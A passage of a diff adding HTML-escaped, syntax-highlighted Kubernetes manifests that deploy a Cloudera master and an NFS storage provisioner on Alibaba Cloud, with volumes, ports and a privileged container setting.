+      &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs-client&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;tolerations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;node-role.kubernetes.io/master&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;effect&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;NoSchedule&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;serviceAccountName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;registry.cn-hangzhou.aliyuncs.com/acs/alicloud-nas-controller:v1.8.4&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#        imagePullPolicy: Never&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs-client&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#        securityContext:&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#          privileged: true&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs-client-root&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/persistentvolumes&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PROVISIONER_NAME&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;alicloud/nas&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;NFS_SERVER&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;NFS_PATH&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/pv/cloudera/agent/&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nfs-client-root&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;nfs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/pv/cloudera/agent/&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;storage.k8s.io/v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;StorageClass&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-storage&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;storage&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;reclaimPolicy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Delete&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;provisioner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;alicloud/nas&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;apps/v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Deployment&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-deploy&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-deploy&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;replicas&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;revisionHistoryLimit&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;matchLabels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;tolerations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;effect&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;NoSchedule&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;node-role.kubernetes.io/master&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;restartPolicy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Always&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;serviceAccountName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;automountServiceAccountToken&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-svc&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-master&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;registry-vpc.cn-hangzhou.aliyuncs.com/huaching_prod/cloudera-master:5.14.2&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#        imagePullPolicy: IfNotPresent&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;limits&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4096Mi&quot;&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;cpu&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1000m&quot;&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;lifecycle&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;preStop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-c&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/cloudera-init/run/stop.sh&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/cloudera/log/stop.log&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#- name: cloudera-init&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#mountPath: /cloudera-init/run/&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;mysql&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/var/lib/mysql/&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;repo&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/opt/cloudera/parcel-repo/&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/opt/cm/etc/cloudera-scm-agent/&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;HOSTNAME&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;valueFrom&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;configMapKeyRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master_host&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;POD_IP&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;valueFrom&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;fieldRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;fieldPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;status.podIP&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;POD_NAME&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;valueFrom&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;fieldRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+              &lt;span class=&quot;na&quot;&gt;fieldPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;metadata.name&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7180&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ui&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;9000&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;agent&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7182&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7191&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;containerPort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4434&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;parcel-ssl&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;securityContext&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;privileged&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;imagePullSecrets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;registrykey-vpc&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;repo&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;nfs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/pv/cloudera/repo/&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;mysql&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;nfs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/pv/cloudera/master/&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;#- name: cloudera-init&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#configMap:&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#name: cloudera-config&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#defaultMode: 0751&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#items:&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#- key: master.start&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;#path: start.sh&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#- key: master.stop&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;#path: stop.sh&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;#- key: mysql.sql&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;#path: mysql.sql&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;configMap&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config.ini&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;config.ini&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Service&lt;/span&gt;
